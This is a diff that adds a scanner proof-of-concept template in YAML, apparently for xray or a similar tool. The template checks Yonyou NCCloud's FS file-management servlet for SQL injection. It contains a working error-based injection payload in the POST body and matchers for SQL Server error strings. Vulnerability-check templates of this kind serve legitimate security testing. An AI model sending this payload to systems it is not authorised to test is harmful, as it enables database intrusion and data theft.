@@ -1,0 +1,18 @@
+name: poc-yaml-yonyou-nccloud-fs-sqli
+groups:
+  sqli:
+    - method: POST
+      path: /nccloud/fs/cmd/FileServlet
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        pk_bill=1'+AND+1=CONVERT(int,@@version)--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"Microsoft SQL Server") || response.body.bcontains(b"ODBC") || response.body.bcontains(b"Conversion failed") || response.body.bcontains(b"SQL"))
+detail:
+  author: L4xy
+  description: "用友NCCloud FS文件管理接口存在SQL注入漏洞，攻击者可通过构造恶意请求获取数据库敏感信息"
+  links:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-NCCloud-FS%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86SQL%E6%B3%A8%E5%85%A5.md
+  tags: sqli,yonyou,nccloud
